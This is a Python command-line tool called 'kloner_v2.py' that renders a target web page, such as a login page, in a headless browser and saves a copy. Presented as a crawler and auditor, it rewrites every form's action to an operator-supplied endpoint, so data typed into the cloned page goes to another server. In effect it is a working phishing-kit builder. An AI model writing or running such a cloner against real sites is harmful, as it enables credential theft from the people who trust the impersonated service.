#!/usr/bin/env python3
"""
Tool Name   : kloner_v2.py (Dynamic Headless Crawler)
Description : Uses Playwright to render JavaScript-heavy modern web apps,
              detect input zones from the live DOM, and export static snapshots.
"""

import argparse
import asyncio
import json
from pathlib import Path
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright

# --- Terminal ANSI Colors ---
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    print(f"{CYAN}{BOLD}")
    print(r"  _    _                       _                  ")
    print(r" | | _| | ___  _ __   ___ _ __| |__   ___  __     ")
    print(r" | |/ / |/ _ \| '_ \ / _ \ '__| '_ \ / _ \ \ \    ")
    print(r" |   <| | (_) | | | |  __/ |  | |_) | (_) | \ \   ")
    print(r" |_|\_\_|\___/|_| |_|\___|_|  |_.__/ \___/   /_/   ")
    print(r"       [ Dynamic Headless SPA Crawler & Auditor ] ")
    print(f"{RESET}")

async def crawl_and_capture(target_url: str, output_dir: Path, new_endpoint: str):
    output_dir.mkdir(parents=True, exist_ok=True)
    
    print(f"{YELLOW}[*] Launching headless browser (Chromium)...{RESET}")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        page = await context.new_page()

        print(f"{CYAN}[*] Navigating to: {target_url}{RESET}")
        try:
            # Memuat halaman dan menunggu sampai jaringan idle (semua JS/AJAX selesai)
            await page.goto(target_url, wait_until="networkidle", timeout=60000)
        except Exception as e:
            print(f"{RED}[!] Error loading page: {e}{RESET}")
            await browser.close()
            return

        # Ambil DOM yang sudah dirender penuh oleh JavaScript
        rendered_html = await page.content()
        await browser.close()

    # Parse DOM menggunakan BeautifulSoup untuk audit dan modifikasi endpoint
    soup = BeautifulSoup(rendered_html, "html.parser")
    
    forms_audit = []
    
    # 1. Audit & Ubah Action Form
    for idx, form in enumerate(soup.find_all("form"), start=1):
        raw_action = form.get("action", "").strip()
        method = form.get("method", "GET").upper()
        
        fields = []
        for field in form.find_all(["input", "textarea", "select", "button"]):
            fields.append({
                "tag": field.name,
                "type": field.get("type", "text" if field.name == "input" else field.name),
                "name": field.get("name", "-"),
                "id": field.get("id", "-"),
                "placeholder": field.get("placeholder", "-")
            })

        forms_audit.append({
            "form_index": idx,
            "id": form.get("id", "-"),
            "method": method,
            "original_action": raw_action or "(empty / self)",
            "fields_count": len(fields),
            "fields": fields
        })

        # Ubah endpoint form ke server baru jika disediakan
        if new_endpoint:
            form["action"] = new_endpoint

    # Simpan hasil render ke file HTML di folder output
    parsed_url = urlparse(target_url)
    filename = Path(parsed_url.path).name
    if not filename or not filename.endswith((".html", ".htm")):
        filename = "index.html"
    
    output_file = output_dir / filename
    output_file.write_text(str(soup), encoding="utf-8")

    # Cetak Laporan Terminal
    print(f"\n{GREEN}[+] Dynamic Crawl Successful!{RESET}")
    print(f"  ├── Rendered File Saved : {CYAN}{output_file.absolute()}{RESET}")
    print(f"  └── Forms Discovered    : {BOLD}{len(forms_audit)}{RESET}")

    for f in forms_audit:
        print(f"\n      {BOLD}[Form #{f['form_index']}] Method: {GREEN}{f['method']}{RESET} | Fields: {f['fields_count']}")
        print(f"      ├── Old Action  : {YELLOW}{f['original_action']}{RESET}")
        if new_endpoint:
            print(f"      ├── New Action  : {GREEN}{new_endpoint}{RESET}")
        print(f"      └── Input Zones :")
        for field in f["fields"]:
            print(f"          └── <{field['tag']} type=\"{field['type']}\"> name=\"{YELLOW}{field['name']}{RESET}\" id=\"{field['id']}\"")

    # Simpan laporan JSON
    report_path = output_dir / "dynamic_audit_report.json"
    report_path.write_text(json.dumps(forms_audit, indent=2), encoding="utf-8")
    print(f"\n{CYAN}[+] Audit report saved to: {report_path}{RESET}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="Kloner v2: Dynamic Headless Crawler")
    parser.add_argument("url", help="Target URL (e.g., https://example.com/login)")
    parser.add_argument("-u", "--new-url", default="", help="New server endpoint to redirect form data")
    parser.add_argument("-out", "--output-dir", default="newServer", help="Export directory [Default: newServer]")
    
    args = parser.parse_args()
    
    asyncio.run(crawl_and_capture(args.url, Path(args.output_dir), args.new_url))

if __name__ == "__main__":
    main()